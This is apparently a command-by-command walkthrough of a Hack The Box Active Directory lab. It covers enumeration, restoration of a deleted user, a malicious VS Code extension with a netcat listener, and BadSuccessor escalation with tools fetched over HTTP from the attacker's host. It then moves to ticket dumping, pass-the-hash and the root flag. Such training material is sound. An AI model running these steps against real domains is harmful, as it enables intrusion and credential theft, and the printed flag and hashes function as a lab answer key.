# Commands Reference

## 1. Reconnaissance and Initial Enumeration

### Port Scanning

```bash
nmap 10.129.5.154

nmap -sC -sV -T4 -oA checkpoint_ 10.129.5.154
```

### SMB Share Enumeration

```bash
netexec smb 10.129.5.154 -u 'alex.turner' -p 'Checkpoint2024!' --shares
```

### Connecting to SMB Shares

```bash
smbclient '//10.129.5.154/DevDrop' -U 'alex.turner%Checkpoint2024!' -W checkpoint.htb
```

Inside the SMB session:

```bash
ls
```

### User Enumeration via LDAP

```bash
netexec ldap 10.129.5.154 -u 'alex.turner' -p 'Checkpoint2024!' --users | awk '/DC01/ && !/\[\*\]/ && !/\[\+\]/ && !/-Username-/ {print $5}'
```



## 2. Kerberos and Infrastructure Preparation

### Generate Kerberos Configuration

```bash
netexec smb 10.129.5.154 -u 'alex.turner' -p 'Checkpoint2024!' --generate-krb5-conf krb5.conf
```

### Set Kerberos Environment Variable

```bash
export KRB5_CONFIG=krb5.conf
```

### Synchronize Time

```bash
sudo ntpdate 10.129.5.154
```

### Update Hosts File

```bash
echo "10.129.5.154 DC01 DC01.checkpoint.htb checkpoint.htb" | sudo tee -a /etc/hosts
```



## 3. BloodHound Enumeration

### BloodHound CE Python Collector

```bash
bloodhound-ce-python -c All --dns-tcp -d checkpoint.htb -ns 10.129.5.154 -dc DC01.checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --use-ldaps --zip
```

```
bloodhound-ce-python \
  -d checkpoint.htb \
  -u alex.turner \
  -p 'Checkpoint2024!' \
  -dc dc01.checkpoint.htb \
  -ns 10.129.5.154 \
  -c DCOnly \
  --auth-method ntlm
```

```
┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Checkpoint]
└─$ openssl s_client -connect dc01.checkpoint.htb:636 -brief
Connecting to 10.129.5.154
write:errno=104
[ble: exit 1]
```

### Alternative Collection with bloodyAD

```bash
bloodyAD -d checkpoint.htb --host DC01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get bloodhound
```



## 4. Lateral Movement – Restoring a Deleted Object

### Identify Writable Objects

```bash
bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable
```

### Restore Deleted User

```bash
bloodyAD -d checkpoint.htb --host DC01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
```

### Verify Restored Account

```bash
netexec smb 10.129.5.154 -u 'Mark.Davies' -p 'Checkpoint2024!'

netexec smb 10.129.5.154 -u 'Mark.Davies' -p 'Checkpoint2024!' --shares
```



## 5. Initial Access – VS Code Extension

### Create Extension Structure

```bash
mkdir evil-ext && cd evil-ext

mkdir -p extension
```

### Package Extension

```bash
zip -r ../evil.vsix '[Content_Types].xml' extension/
```

### Upload Extension

```bash
smbclient '//10.129.5.154/DevDrop' -u 'checkpoint.htb/Mark.Davies%Checkpoint2024!'
```

Inside the SMB session:

```bash
put evil.vsix
```

### Listener

```bash
nc -lvnp 4444
```



## 6. Privilege Escalation – BadSuccessor

### Start Web Server

```bash
python3 -m http.server 8080
```

### Transfer Required Files

```powershell
wget "http://10.10.16.216/Get-BadSuccessorOUPermissions.ps1" -OutFile "C:\Users\ryan.brooks\Desktop\Get-BadSuccessorOUPermissions.ps1"

wget "http://10.10.16.216/SharpSuccessor.exe" -OutFile "C:\Users\ryan.brooks\Desktop\SharpSuccessor.exe"

wget "http://10.10.16.216/Rubeus.exe" -OutFile "C:\Users\ryan.brooks\Desktop\Rubeus.exe"
```

### Identify Vulnerable OUs

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap 10.129.5.154 -u 'Mark.Davies' -p 'Checkpoint2024!' -M badsuccessor
LDAP        10.129.5.154    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.5.154    389    DC01             [+] checkpoint.htb\Mark.Davies:Checkpoint2024! 
BADSUCCE... 10.129.5.154    389    DC01             [+] Found domain controller with operating system Windows Server 2025: 10.129.5.154 (DC01.checkpoint.htb)
BADSUCCE... 10.129.5.154    389    DC01             [+] Found 2 results
BADSUCCE... 10.129.5.154    389    DC01             alex.turner (S-1-5-21-3129162710-3498938529-1807524340-1101), OU=Employees,DC=checkpoint,DC=htb
BADSUCCE... 10.129.5.154    389    DC01             ryan.brooks (S-1-5-21-3129162710-3498938529-1807524340-1103), OU=DMSAHolder,DC=checkpoint,DC=htb
```

### Ticket Handling

```powershell
PS C:\Users\ryan.brooks\Desktop> .\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: RJnM5e3K+gFW754bB5AKmiDyIAYC3Y3QAzImxRERRaU=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRukXVAwW3gKO8cGsxAALas1i21kgp4dzry/RpyYt9oBl61w3GTuxzRSdGqh2N2rn7DzZpLLcb8opnG7AU8f1YsMt75jfgZAdcA611EBVmg852gWhh4OYV3jL4l5afkR+A14FI+jZiP9zIv+z+mrQp3BpO4sk46chdsjp+6XsvY+5/aMz4ziT4wS9vaSkgiCrcQDfhsx2ej1BwKBq7+UpMju/l2v+LmdGF0I+YURn1vVnMYSxvC7Yii8YEkoZRyBUB3gO7kaFpWTBCaSTiTL9K+SvHIPyKwPIexT3W/um/ITMvrujvlDYQa3aW2hs8exyIe6nDgOx+jXYBtth15Ze9lqiUrtWhG6iSmCXgjmmhjmtn0oNOwH9kHo7oz1M6TN/7c2XNDd1eZjoJai4SmT39OHWuQjf7NNvk9EDsHK1YyLRUqF60XCG3fEVjreriZyTjHnYPEeVKQ3edr8dxClFgVTxhQchQBUvBLVcl98GFSDE+dm79RahE2/5JTqPkeHZI2kbleLzeenVV5wpYPk7YoQTDaif2w6ememYuQ2qpE+IGYPxIpBMJVAO3h0vZ813LhzimUxGA1yQ8IR1SOz4iBScqrWG69hfeOIsnA93QL74qo/6WouUGsQdpXyEQR2tZO0lZKQOLhrqBj0oky0on6kI+qR5/mQ68ChpGaLhm+D1ggd4PrWMk1e2Qn/EEDl7vBb9IxYadP2ADL6vzAELGX9NhfFQsi/2Xc34EcOPRWYSQz3pEEcTSFX95EKW6EoXqh83ZpUYwY+EMtyQCb4YvPxwdxK5xV2ms2hzba9U7QQl5DU/e9W6qK1+2lNdN4DnhnJC77syGgG/cIgp5xISTHLSp/FQQ9kSHOJa9fz32tx8I+b0AsSPNnM/MK3gx2nKEM+aarRwZXorpqiVUQb04pdkL4t/QdO1/yy6UelO3i7xARVqENqBa+gCE2mLtmY9f8Sqwp3PJptWqwgzOSb5D6BbwJPwlK7XsHgenj5Jmpaz492QQo8u0ixOtnmcxN2Ei+8rAqe9uQ7z+55oMbYbsyZRNbAoBfQ0gysWoA50fyVULAj9hsJRw8Cjz0gtpqJjJ7UUrSVdzu94+beZHNBxtm3exDknolPgXJmFAYm4hjjoYepbzwafNsWIKVSFVyzkrctgbnx2vsZ+Otc2eL5DMMcTW21u/ooJqn4lXXzqgiTWANc/exhmzxLFZcGhc4GBx9FXYlgtoIJtQqmHuyXpXnieb1JtuEm7ysZVwTSJhpYzB+2xbxrTmC8+bXLUcx21NOtV1xYS3xpp+6CEJHmTqaB2h3hjY1cRMZeAfLgt6QpM81E/OjnZsXbHYB/54XeePsKm1L3pvdcQJLM5Hu5paiEpiE5r6bXLvUkpiPbe4HawT402dOCfUb+Prfb0dMAz2I/2K5RfrRQRwWVwKwdx2HJ97W+xxHA0VuaXij7jH2VhhbtKG0kFwM0KDa6HJFjtsHApF2wMeneQwoNu36iDbOjN/IRREUJ587q1B2r6tPo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgEOhucU9st4XdfKUOQ281jT61ngJBkaV+kZNbHec5X3qhEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDYxODExMTM1MFqmERgPMjAyNjA2MTgyMTEzNTBapxEYDzIwMjYwNjI1MTExMzUwWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=

```

```bash
cat ryan.b64_kirbi | base64 -d > ryan.kirbi

impacket-ticketConverter ryan.kirbi ryan.ccache
```

### Configure Kerberos Cache

```bash
export KRB5CCNAME=ryan.ccache
```

### Execute BadSuccessor

```bash
bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k ccache=/home/kali/htb/checkpoint/ryan.ccache add badSuccessor evil-dmsa -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```



## 7. Post-Exploitation – Memory Forensics

### Authenticate to Backup Share

```bash
netexec smb 10.129.5.154 -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
```

```bash
smbclient //10.129.5.154/VMBackups -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash
```

Inside the SMB session:

```bash
ls
```

### Download Snapshot

```bash
mkdir -p loot/vmbackup
```

```bash
smbclient //10.129.5.154/VMBackups -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash -c 'lcd loot/vmbackup; cd "NightlyBackup_2024-11-01/memory forensics"; get "Windows Server 2019-Snapshot1.vmem"'
```

### Volatility Environment

```bash
python3 -m venv .venv-vol

.venv-vol/bin/pip install --upgrade pip

.venv-vol/bin/pip install volatility3 pycryptodome
```

### Memory Analysis

```bash
.venv-vol/bin/vol -q -f "loot/vmbackup/Windows Server 2019-Snapshot1.vmem" windows.info.Info

.venv-vol/bin/vol -q -f "loot/vmbackup/Windows Server 2019-Snapshot1.vmem" windows.registry.hivelist.HiveList

.venv-vol/bin/vol -q -f "loot/vmbackup/Windows Server 2019-Snapshot1.vmem" windows.hashdump.Hashdump
```



## 8. Domain Compromise

### Authenticate as Administrator

```bash
netexec smb 10.129.5.154 -u administrator -H f29e9c014295b9b32139b09a2790be3b
```

### Obtain Root Flag

```bash
evil-winrm-py -i 10.129.5.154 -u administrator -H f29e9c014295b9b32139b09a2790be3b
```

```powershell
Get-Content C:\Users\max.palmer\Desktop\root.txt
```

### Root Flag

```text
3788b2f6a4fdc4117f874933a856358d
```
